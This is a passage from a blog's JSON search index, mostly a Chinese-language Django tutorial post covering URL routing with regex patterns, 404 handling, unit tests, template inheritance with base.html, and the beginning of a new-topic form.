1.19303364]])1#梯度下降得到的结果是matrix([[-3.24140214, 1.1272942 ]]) 在练习2中，我们将看看分类问题的逻辑回归。","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"线性回归","slug":"线性回归","permalink":"https://fishni.github.io/tags/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"}]},{"title":"【Django】3. Django入门与实践-高级概念","slug":"3. Django入门与实践-高级概念","date":"2020-05-03T16:00:00.000Z","updated":"2020-05-06T08:40:25.880Z","comments":true,"path":"2020/05/04/3. Django入门与实践-高级概念/","link":"","permalink":"https://fishni.github.io/2020/05/04/3.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E9%AB%98%E7%BA%A7%E6%A6%82%E5%BF%B5/","excerpt":"在本节内容，将深入理解两个基本概念: URLs 和 Forms。在这个过程中，我们还将学习其它很多概念，如创建可重用模板和安装第三方库。同时我们还将编写大量单元测试。","text":"在本节内容，将深入理解两个基本概念: URLs 和 Forms。在这个过程中，我们还将学习其它很多概念，如创建可重用模板和安装第三方库。同时我们还将编写大量单元测试。 首先，在之前的学习基础上，更新models.py boards/models.py 123456789class Topic(models.Model): # other fields... # Add `auto_now_add=True` to the `last_updated` field last_updated = models.DateTimeField(auto_now_add=True)class Post(models.Model): # other fields... # Add `null=True` to the `updated_by` field updated_by = models.ForeignKey(User, null=True, related_name='+') 现在在已经激活的 virtualenv 环境中执行命令： python manage.py makemigrations python manage.py migrate 如果在你的程序中 update_by字段中已经有了null=True 且 last_updated字段中有了auto_now_add=True，你可以放心地忽略上面这步操作。 URLs随着我们项目的开发，实现一个新的功能，就是列出某个板块下的所有主题列表，回顾一下，上节画的线框图 从myproject 目录中编写 urls.py 开始： 12345678910from django.conf.urls import urlfrom django.contrib import adminfrom boards import viewsurlpatterns = [ url(r'^$', views.home, name='home'), url(r'^boards/(?P&lt;pk&gt;\\d+)/$', views.board_topics, name='board_topics'), url(r'^admin/', admin.site.urls),] 分析一下 urlpatterns 和 url URL 调度器（dispatcher） 和 URLconf (URL configuration) 是 Django 应用中的基础部分。 Django开发团队正在致力于将路由语法简化（译注：就是将原来url函数替换成 path 函数，目前django2.0已经正式使用新的路由语法） 一个项目可以有很多 urls.py 分布在多个应用（app）中。Django 需要一个 url.py 作为入口。这个特殊的 urls.py 叫做根路由配置（root URLconf）。它被定义在 settings.py 中。 myproject/settings.py 1ROOT_URLCONF = 'myproject.urls' 它已经自动配置好了，你不需要去改变它任何东西。 当 Django 接受一个请求(request)， 它就会在项目的 URLconf 中寻找匹配项。他从 urlpatterns 变量的第一条开始，然后在每个 url 中去匹配请求的 URL。 如果 Django 找到了一个匹配路径，他会把请求(request)发送给 url 的第二个参数 视图函数（view function）。urlpatterns 中的顺序很重要，因为 Django 一旦找到匹配就会停止往后搜索。如果 Django 在 URLconf 中没有找到匹配项，他会通过 Page Not Found 的错误处理代码抛出一个 404 异常。 这是 url函数的剖析： 12def url(regex, view, kwargs=None, name=None): # ... regex： 匹配 URL patterns 的正则表达式。注意：正则表达式会忽略掉 GET 或者 POST 后面的参数。在一个 http://127.0.0.1:8000/boards/?page=2的请求中，只有 /boards/ 会被处理。 view： 视图函数被用来处理用户请求，同时它还可以是 django.conf.urls.include 函数的返回值，它将引用一个外部的urls.py文件，例如，你可以使用它来定义一组特定于应用的 URLs，使用前缀将其包含在根 URLconf 中。我们会在后面继续探讨这个概念。 kwargs：传递给目标视图函数的任意关键字参数，它通常用于在可重用视图上进行一些简单的定制，我们不是经常使用它。 name:： 该 URL 的唯一标识符。这是一个非常重要的特征。要始终记得为你的 URLs 命名。所以，很重要的一点是：不要在 views(视图) 或者 templates(模板) 中硬编码 URL，而是通过它的名字去引用 URL。 基础 URLs 路由基础URL创建起来很容易。就只是个匹配字符串的问题。比如说，我们想创建一个 “about” 页面，可以这样定义： 1234567from django.conf.urls import urlfrom boards import viewsurlpatterns = [ url(r'^$', views.home, name='home'), url(r'^about/$', views.about, name='about'),] 我们也可以创建更深层一点的 URL 结构 123456789101112from django.conf.urls import urlfrom boards import viewsurlpatterns = [ url(r'^$', views.home, name='home'), url(r'^about/$', views.about, name='about'), url(r'^about/company/$', views.about_company, name='about_company'), url(r'^about/author/$', views.about_author, name='about_author'), url(r'^about/author/vitor/$', views.about_vitor, name='about_vitor'), url(r'^about/author/erica/$', views.about_erica, name='about_erica'), url(r'^privacy/$', views.privacy_policy, name='privacy_policy'),] 这是一些简单的 URL 路由的例子，对于上面所有的例子，视图函数都是下面这个结构： 12345678def about(request): # do something... return render(request, 'about.html')def about_company(request): # do something else... # return some data along with the view... return render(request, 'about_company.html', &#123;'company_name': 'Simple Complex'&#125;) 高级 URLs 路由更高级的URL路由使用方法是通过正则表达式来匹配某些类型的数据并创建动态 URL 例如，要创建一个个人资料的页面，诸如 github.com/vitorfs or twitter.com/vitorfs(vitorfs 是我的用户名) 这样，我们可以像以下几点这样做： 1234567from django.conf.urls import urlfrom boards import viewsurlpatterns = [ url(r'^$', views.home, name='home'), url(r'^(?P&lt;username&gt;[\\w.@+-]+)/$', views.user_profile, name='user_profile'),] 它会匹配 Django 用户模型里面所有有效的用户名。 现在我们可以看到上面的例子是一个很宽松的 URL。这意味大量的 URL patterns 都会被它匹配，因为它定义在 URL 的根，而不像 /profile// 这样。在这种情况下，如果我们想定义一个 /about/ 的URL，我们要把它定义在这个 username URL pattern 的前面： 12345678from django.conf.urls import urlfrom boards import viewsurlpatterns = [ url(r'^$', views.home, name='home'), url(r'^about/$', views.about, name='about'), url(r'^(?P&lt;username&gt;[\\w.@+-]+)/$', views.user_profile, name='user_profile'),] 如果这个 “about” 页面定义在usrename URL pattern 后面，Django 将永远找不到它，因为 “about” 这个单词会先被usrname的正则表达式所匹配到，视图函数user_profile将会被执行而不是执行 about 此外，这有一些副作用。例如，从现在开始，我们要把 “about” 视为禁止使用的username，因为如果有用户将 “about” 作为他们的username，他们将永远不能看到他们的个人资料页面，而看到的about页面。 如果你想给用户个人主页设置一个很酷的主页的URL，那么避免冲突最简单的方法是添加一个前缀，例如：/u/vitorfs，或者像 Medium 一样使用 @ 作为前缀 /@vitorfs/。 这些 URL 路由的主要思想是当 URL 的一部分被当作某些资源(这些资源用来构成某个页面)的标识的时候就去创建一个动态页面。比如说，这个标识可以是一个整数的 ID 或者是一个字符串 开始的时候，我们使用 Board ID 去创建 Topics列表的动态页面。让我们再来看一下我在 URLs 开头的部分给出的例子： 1url(r'^boards/(?P&lt;pk&gt;\\d+)/$', views.board_topics, name='board_topics') 正则表达式中的\\d+会匹配一个任意大小的整数值。这个整数值用来从数据库中取到 指定的 Board。现在注意我们这样写这个正则表达式 (?P&lt;pk&gt;\\d+)，这是告诉 Django 将捕获到的值放入名为 pk 的关键字参数中。 这时我们为它写的一个视图函数： 12def board_topics(request, pk): # do something ... 因为我们使用了 (?P&lt;pk&gt;\\d+) 正则表达式，在board_topics函数中，关键字参数必须命名为 pk 如果你想在视图函数使用任意名字的参数，那么可以这样定义： 1url(r'^boards/(\\d+)/$', views.board_topics, name='board_topics') 然后在视图函数可以这样定义： 12def board_topics(request, board_id): # do something... 或者这样： 12def board_topics(request, id): # do something... 名字无关紧要，但是使用命名参数是一个很好的做法，因为，当我们有个更大的URL去捕获多个 ID 和变量时，这会更便于我们阅读 PK or ID？PK 表示主键（Primary key），这是访问模型的主键ID的简写方法，所有Django模型都有这个属性，更多的时候，使用pk属性和使用id是一样的，这是因为如果我们没有给model定义主键时，Django将自动创建一个 AutoField 类型的字段，名字叫做 id，它就是主键。如果你给model定义了一个不同的主键，例如，假设 email 是你的主键，你就可以这样访问：obj.email 或者 obj.pk，二者是等价的。 使用 URLs API我们来实现我在开头提到的主题列表页面 首先，编辑 urls.py， 添加新的 URL 路由 myproject/urls.py 12345678910from django.conf.urls import urlfrom django.contrib import adminfrom boards import viewsurlpatterns = [ url(r'^$', views.home, name='home'), url(r'^boards/(?P&lt;pk&gt;\\d+)/$', views.board_topics, name='board_topics'), url(r'^admin/', admin.site.urls),] 现在创建视图函数 board_topics： boards/views.py 123456789from django.shortcuts import renderfrom .models import Boarddef home(request): # code suppressed for brevitydef board_topics(request, pk): board = Board.objects.get(pk=pk) return render(request, 'topics.html', &#123;'board': board&#125;) 在 templates 目录中，创建一个名为 topics.html 的模板： templates/topics.html 12345678910111213141516&#123;% load static %&#125;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;&#123;&#123; board.name &#125;&#125;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"&#123;% static 'css/bootstrap.min.css' %&#125;\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"container\"&gt; &lt;ol class=\"breadcrumb my-4\"&gt; &lt;li class=\"breadcrumb-item\"&gt;Boards&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/li&gt; &lt;/ol&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 注意：我们现在只是创建新的 HTML 模板。不用担心，在下一节中我会向你展示如何创建可重用模板。 现在在浏览器中打开 URL http://127.0.0.1:8000/boards/1/ ，结果应该是下面这个页面： 进行测试编写，编辑 test.py，在文件底部添加下面的测试： boards/tests.py 1234567891011121314151617181920212223242526from django.core.urlresolvers import reversefrom django.urls import resolvefrom django.test import TestCasefrom .views import home, board_topicsfrom .models import Boardclass HomeTests(TestCase): # ...class BoardTopicsTests(TestCase): def setUp(self): Board.objects.create(name='Django', description='Django board.') def test_board_topics_view_success_status_code(self): url = reverse('board_topics', kwargs=&#123;'pk': 1&#125;) response = self.client.get(url) self.assertEquals(response.status_code, 200) def test_board_topics_view_not_found_status_code(self): url = reverse('board_topics', kwargs=&#123;'pk': 99&#125;) response = self.client.get(url) self.assertEquals(response.status_code, 404) def test_board_topics_url_resolves_board_topics_view(self): view = resolve('/boards/1/') self.assertEquals(view.func, board_topics) 这里需要注意几件事情。这次我们使用了 setUp方法。在这个方法中，我们创建了一个 Board 实例来用于测试。我们必须这样做，因为 Django 的测试机制不会针对当前数据库跑你的测试。运行 Django 测试时会即时创建一个新的数据库，应用所有的model(模型)迁移 ，运行测试完成后会销毁这个用于测试的数据库。 因此在 setUp 方法中，我们准备了运行测试的环境，用来模拟场景。 test_board_topics_view_success_status_code 方法：测试 Django 是否对于现有的 Board 返回 status code(状态码) 200(成功)。 test_board_topics_view_not_found_status_code 方法：测试 Django 是否对于不存在于数据库的 Board 返回 status code 404(页面未找到)。 test_board_topics_url_resolves_board_topics_view 方法：测试 Django 是否使用了正确的视图函数去渲染 topics。 现在来运行一下测试： python manage.py test 输出如下： 123456789101112131415Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced)..E...&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;ERROR: test_board_topics_view_not_found_status_code (boards.tests.BoardTopicsTests)----------------------------------------------------------------------Traceback (most recent call last):# ...boards.models.DoesNotExist: Board matching query does not exist.----------------------------------------------------------------------Ran 5 tests in 0.093sFAILED (errors&#x3D;1)Destroying test database for alias &#39;default&#39;... 测试 test_board_topics_view_not_found_status_code 失败。我们可以在 Traceback 中看到返回了一个 exception(异常) “boards.models.DoesNotExist: Board matching query does not exist.” 在 DEBUG=False 的生产环境中，访问者会看到一个 500 Internal Server Error 的页面。但是这不是我们希望得到的。 想要一个 404 Page Not Found 的页面。让我们来重写我们的视图函数。 boards/views.py 12345678910111213from django.shortcuts import renderfrom django.http import Http404from .models import Boarddef home(request): # code suppressed for brevitydef board_topics(request, pk): try: board = Board.objects.get(pk=pk) except Board.DoesNotExist: raise Http404 return render(request, 'topics.html', &#123;'board': board&#125;) 重新测试一下： python manage.py test 12345678Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced)......----------------------------------------------------------------------Ran 5 tests in 0.021sOKDestroying test database for alias &#39;default&#39;... 访问浏览器，它将按照预期工作： 这是 Django 在 DEBUG=False 的情况下显示的默认页面。稍后，我们可以自定义 404 页面去显示一些其他的东西。 这是一个常见的用法。事实上， Django 有一个快捷方式去得到一个对象，或者返回一个不存在的对象 404。 因此让我们再来重写一下 board_topics 函数： 123456789from django.shortcuts import render, get_object_or_404from .models import Boarddef home(request): # code suppressed for brevitydef board_topics(request, pk): board = get_object_or_404(Board, pk=pk) return render(request, 'topics.html', &#123;'board': board&#125;) 修改了代码，测试一下。 python manage.py test 12345678Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced)......----------------------------------------------------------------------Ran 5 tests in 0.043sOKDestroying test database for alias &#39;default&#39;... 没有破坏任何东西。我们可以继续我们的开发。 下一步是在屏幕上创建一个导航链接。主页应该有一个链接指引访问者去访问指定板块下面的主题列表页面。同样地，topics 页面也应当有一个返回主页的链接。 我们可以先为 HomeTests 类编写一些测试： boards/test.py 12345678910111213141516class HomeTests(TestCase): def setUp(self): self.board = Board.objects.create(name='Django', description='Django board.') url = reverse('home') self.response = self.client.get(url) def test_home_view_status_code(self): self.assertEquals(self.response.status_code, 200) def test_home_url_resolves_home_view(self): view = resolve('/') self.assertEquals(view.func, home) def test_home_view_contains_link_to_topics_page(self): board_topics_url = reverse('board_topics', kwargs=&#123;'pk': self.board.pk&#125;) self.assertContains(self.response, 'href=\"&#123;0&#125;\"'.format(board_topics_url)) 注意到现在我们同样在 HomeTests 中添加了 setUp 方法。这是因为我们现在需要一个 Board 实例，并且我们将 url 和 response 移到了 setUp，所以我们能在新测试中重用相同的 response。 这里的新测试是 test_home_view_contains_link_to_topics_page。我们使用 assertContains 方法来测试 response 主体部分是否包含给定的文本。我们在测试中使用的文本是 a标签的 href部分。所以基本上我们是在测试 response 主体是否包含文本href=&quot;/boards/1/&quot;。 让我们运行这个测试： python manage.py test 12345678910111213Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced).....F.&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;FAIL: test_home_view_contains_link_to_topics_page (boards.tests.HomeTests)----------------------------------------------------------------------AssertionError: False is not true : Couldn&#39;t find &#39;href&#x3D;&quot;&#x2F;boards&#x2F;1&#x2F;&quot;&#39; in response----------------------------------------------------------------------Ran 6 tests in 0.034sFAILED (failures&#x3D;1)Destroying test database for alias &#39;default&#39;... 现在我们可以编写能通过这个测试的代码。 编写 home.html 模板： templates/home.html 123456789101112131415&lt;!-- code suppressed for brevity --&gt;&lt;tbody&gt; &#123;% for board in boards %&#125; &lt;tr&gt; &lt;td&gt; &lt;a href=\"&#123;% url 'board_topics' board.pk %&#125;\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/a&gt; &lt;small class=\"text-muted d-block\"&gt;&#123;&#123; board.description &#125;&#125;&lt;/small&gt; &lt;/td&gt; &lt;td class=\"align-middle\"&gt;0&lt;/td&gt; &lt;td class=\"align-middle\"&gt;0&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125;&lt;/tbody&gt;&lt;!-- code suppressed for brevity --&gt; 我们只改动了这一行： {{ board.name }} 变为： 1&lt;a href=\"&#123;% url 'board_topics' board.pk %&#125;\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/a&gt; 始终使用 {% url %} 模板标签去写应用的 URL。第一个参数是 URL 的名字(定义在 URLconf， 即 urls.py)，然后你可以根据需求传递任意数量的参数。 如果是一个像主页这种简单的 URL, 那就是 {% url 'home' %}。 保存文件然后再运行一下测试： python manage.py test 12345678Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced).......----------------------------------------------------------------------Ran 6 tests in 0.035sOKDestroying test database for alias &#39;default&#39;... 访问浏览器： 现在轮到返回的链接了，我们可以先写测试： boards/tests.py 12345678class BoardTopicsTests(TestCase): # code suppressed for brevity... def test_board_topics_view_contains_link_back_to_homepage(self): board_topics_url = reverse('board_topics', kwargs=&#123;'pk': 1&#125;) response = self.client.get(board_topics_url) homepage_url = reverse('home') self.assertContains(response, 'href=\"&#123;0&#125;\"'.format(homepage_url)) 运行测试： python manage.py test 1234567891011Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced)..F.....&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;FAIL: test_board_topics_view_contains_link_back_to_homepage (boards.tests.BoardTopicsTests)--------------------------------------------------------------------------------------------------------------------------------------------Ran 7 tests in 0.053sFAILED (failures&#x3D;1)Destroying test database for alias &#39;default&#39;... 更新主题列表模板： templates/topics.html 123456789101112&#123;% load static %&#125;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt;&lt;!-- code suppressed for brevity --&gt;&lt;/head&gt; &lt;body&gt; &lt;div class=\"container\"&gt; &lt;ol class=\"breadcrumb my-4\"&gt; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'home' %&#125;\"&gt;Boards&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/li&gt; &lt;/ol&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 运行测试： python manage.py test 12345678Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced)........----------------------------------------------------------------------Ran 7 tests in 0.038sOKDestroying test database for alias &#39;default&#39;... URL 路由是一个 web 应用程序的基本组成部分。有了这些知识，我们才能继续开发。下一步是完成 URL 的部分，你会看到一些使用 URL patterns 的总结。 实用URL模式列表技巧部分是正则表达式。我准备了一个最常用的 URL patterns 的列表。当你需要一个特定的 URL 时你可以参考这个列表。 主键 自增字段 正则表达式 (?P&lt;pk&gt;\\d+) 举例 url(r'^questions/(?P&lt;pk&gt;\\d+)/$', views.question, name='question') 有效URL /questions/934/ 捕获数据 {'pk': '934'} Slug 字段 正则 (?P&lt;slug&gt;[-\\w]+) 举例 url(r'^posts/(?P&lt;slug&gt;[-\\w]+)/$', views.post, name='post') 有效 URL /posts/hello-world/ 捕获数据 {'slug': 'hello-world'} 有主键的 Slug 字段 正则 (?P&lt;slug&gt;[-\\w]+)-(?P&lt;pk&gt;\\d+) 举例 url(r'^blog/(?P&lt;slug&gt;[-\\w]+)-(?P&lt;pk&gt;\\d+)/$', views.blog_post, name='blog_post') 有效 URL /blog/hello-world-159/ 捕获数据 {'slug': 'hello-world', 'pk': '159'} Django 用户名 正则 (?P&lt;username&gt;[\\w.@+-]+) 举例 url(r'^profile/(?P&lt;username&gt;[\\w.@+-]+)/$', views.user_profile, name='user_profile') 有效 URL /profile/vitorfs/ 捕获数据 {'username': 'vitorfs'} Year 正则 (?P&lt;year&gt;[0-9]{4}) 举例 url(r'^articles/(?P&lt;year&gt;[0-9]{4})/$', views.year_archive, name='year') 有效 URL /articles/2016/ 捕获数据 {'year': '2016'} Year / Month 正则 (?P&lt;year&gt;[0-9]{4})/(?P&lt;month&gt;[0-9]{2}) 举例 url(r'^articles/(?P&lt;year&gt;[0-9]{4})/(?P&lt;month&gt;[0-9]{2})/$', views.month_archive, name='month') 有效 URL /articles/2016/01/ 捕获数据 {'year': '2016', 'month': '01'} 你可以在这篇文章中看到更多关于正则表达式匹配的细节：https://simpleisbetterthancomplex.com/references/2016/10/10/url-patterns.html 复用模板到目前为止，我们一直在复制和粘贴 HTML 文档的多个部分。从长远来看是不可行的。这也是一个坏的做法。 下面我们将重写 HTML 模板，创建一个master page(母版页)，其他模板添加它所独特的部分。 在templates 文件夹中创建一个名为 base.html 的文件： templates/base.html 123456789101112131415161718&#123;% load static %&#125;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;&#123;% block title %&#125;Django Boards&#123;% endblock %&#125;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"&#123;% static 'css/bootstrap.min.css' %&#125;\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"container\"&gt; &lt;ol class=\"breadcrumb my-4\"&gt; &#123;% block breadcrumb %&#125; &#123;% endblock %&#125; &lt;/ol&gt; &#123;% block content %&#125; &#123;% endblock %&#125; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 这是我们的母版页。每个我们创建的模板都 extend(继承) 这个特殊的模板。现在我们介绍 {% block %} 标签。它用于在模板中保留一个空间，一个”子”模板(继承这个母版页的模板)可以在这个空间中插入代码和 HTML。 在 {% block title %} 中我们还设置了一个默认值 “Django Boards.”。如果我们在子模板中未设置 {% block title %}的值它就会被使用。 现在让我们重写我们的两个模板： home.html 和 topics.html。 templates/home.html 12345678910111213141516171819202122232425262728293031&#123;% extends 'base.html' %&#125;&#123;% block breadcrumb %&#125; &lt;li class=\"breadcrumb-item active\"&gt;Boards&lt;/li&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;table class=\"table\"&gt; &lt;thead class=\"thead-inverse\"&gt; &lt;tr&gt; &lt;th&gt;Board&lt;/th&gt; &lt;th&gt;Posts&lt;/th&gt; &lt;th&gt;Topics&lt;/th&gt; &lt;th&gt;Last Post&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &#123;% for board in boards %&#125; &lt;tr&gt; &lt;td&gt; &lt;a href=\"&#123;% url 'board_topics' board.pk %&#125;\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/a&gt; &lt;small class=\"text-muted d-block\"&gt;&#123;&#123; board.description &#125;&#125;&lt;/small&gt; &lt;/td&gt; &lt;td class=\"align-middle\"&gt;0&lt;/td&gt; &lt;td class=\"align-middle\"&gt;0&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/tbody&gt; &lt;/table&gt;&#123;% endblock %&#125; home.html 的第一行是 {% extends 'base.html' %}。这个标签用来告诉 Django 使用 base.html 作为母版页。之后，我们使用 blocks 来放置这个页面独有的部分。 templates/topics.html 1234567891011121314&#123;% extends 'base.html' %&#125;&#123;% block title %&#125; &#123;&#123; board.name &#125;&#125; - &#123;&#123; block.super &#125;&#125;&#123;% endblock %&#125;&#123;% block breadcrumb %&#125; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'home' %&#125;\"&gt;Boards&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/li&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;!-- just leaving it empty for now. we will add core here soon. --&gt;&#123;% endblock %&#125; 在 topics.html 中，我们改变了 {% block title %} 的默认值。注意我们可以通过调用 {{ block.super }} 来重用 block 的默认值。这里我们使用的网页标题是 base.html 中定义的 “Django Boards”。所以对于 “Python” 的 board 页面，这个标题是 “Python - Django Boards”,对于 “Random” board 标题会是 “Random - Django Boards”。 运行测试，并未破坏之前： python manage.py test 12345678Creating test database for alias &#39;default&#39;...System check identified no issues (0 silenced)........----------------------------------------------------------------------Ran 7 tests in 0.055sOKDestroying test database for alias &#39;default&#39;... 有了 bast.html 模板，我们可以很轻松地在顶部添加一个菜单块： templates/base.html 12345678910111213141516171819202122232425&#123;% load static %&#125;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;&#123;% block title %&#125;Django Boards&#123;% endblock %&#125;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"&#123;% static 'css/bootstrap.min.css' %&#125;\"&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=\"navbar navbar-expand-lg navbar-dark bg-dark\"&gt; &lt;div class=\"container\"&gt; &lt;a class=\"navbar-brand\" href=\"&#123;% url 'home' %&#125;\"&gt;Django Boards&lt;/a&gt; &lt;/div&gt; &lt;/nav&gt; &lt;div class=\"container\"&gt; &lt;ol class=\"breadcrumb my-4\"&gt; &#123;% block breadcrumb %&#125; &#123;% endblock %&#125; &lt;/ol&gt; &#123;% block content %&#125; &#123;% endblock %&#125; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 访问浏览器： 这里使用的 HTML 是 Bootstrap 4 Navbar 组件 的一部分。 表单处理Forms(表单) 用来处理我们的输入。这在任何 web 应用或者网站中都是很常见的任务。标准的做法是通过 HTML 表单实现，用户输入一些数据，将其提交给服务器，然后服务器处理它。 表单处理是一项非常复杂的任务，因为它涉及到与应用多个层面的交互。有很多需要关心的问题。例如，提交给服务器的所有数据都是字符串的形式，所以在我们使用它之前需要将其转换为需要的数据类型(整形，浮点型，日期等)。我们必须验证有关应用程序业务逻辑的数据。我们还需要妥善地清理和审查数据，以避免一些诸如 SQL 注入和 XSS 攻击等安全问题。 好消息是，Django Forms API 使整个过程变的更加简单，从而实现了大量工作的自动化。而且，最终的结果比大多数程序员自己去实现的代码更加安全。所以，不管 HTML 的表单多么简单，总是使用Form API。 自己实现表单起初，我想直接跳到表单 API。但是我觉得花点时间去了解一下表单处理的基本细节是一个不错的主意。否则，这玩意儿将会看起来像魔术一样，这是一件坏事，因为当出现错误时，你将不知道怎么去找到问题所在。 随着对一些编程概念的深入理解，我们可以感觉到自己能更好地掌控一些情况。掌控是很重要的，因为它让我们写代码的时候更有信心。一旦我们能确切地知道发生了什么，实现可预见行为的代码就容易多了。调试和查找错误也变得很容易，因为你知道去哪里查找。 无论如何，让我们开始实现下面的表单： 这是我们在前面学习绘制的线框图。我现在意识到这个可能是一个不好的例子，因为这个特殊的表单涉及到处理两个不同模型数据：Topic(subject) 和 Post(message)。 还有一点很重要的我们到现在为止还没讨论过，就是用户认证。我们应该只为登录认证过的用户去显示这个页面。通过这种方式，我们才能知道是谁创建了 Topic 或者 Post。 现在让我们抽象一些细节，重点了解一下怎么在数据库中保存用户的输入。 首先，先创建一个新的 URL 路由，命名为 new_topic： myproject/urls.py 1234567891011from django.conf.urls import urlfrom django.contrib import adminfrom boards import viewsurlpatterns = [ url(r'^$', views.home, name='home'), url(r'^boards/(?P&lt;pk&gt;\\d+)/$', views.board_topics, name='board_topics'), url(r'^boards/(?P&lt;pk&gt;\\d+)/new/$', views.new_topic, name='new_topic'), url(r'^admin/', admin.site.urls),] 我们创建的这个 URL 能帮我们标识正确的 Board 现在来创建new_topic 的 视图函数： boards/views.py 123456from django.shortcuts import render, get_object_or_404from .models import Boarddef new_topic(request, pk): board = get_object_or_404(Board, pk=pk) return render(request, 'new_topic.html', &#123;'board': board&#125;) 目前为止， new_topic 的视图函数看起来和 board_topics 恰好相同。这是故意的，让我们一步步地来。 现在我们需要一个名为 new_topic.html 的模板： templates/new_topic.html 12345678910111213&#123;% extends 'base.html' %&#125;&#123;% block title %&#125;Start a New Topic&#123;% endblock %&#125;&#123;% block breadcrumb %&#125; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'home' %&#125;\"&gt;Boards&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item\"&gt;&lt;a href=\"&#123;% url 'board_topics' board.pk %&#125;\"&gt;&#123;&#123; board.name &#125;&#125;&lt;/a&gt;&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;New topic&lt;/li&gt;&#123;% endblock %&#125;&#123;% block content %&#125;&#123;% endblock %&#125; 现在我们只有 breadcrumb 导航。注意我们包含了返回到 board_topics 视图 URL。 访问浏览器：http://127.0.0.1:8000/boards/1/new/ 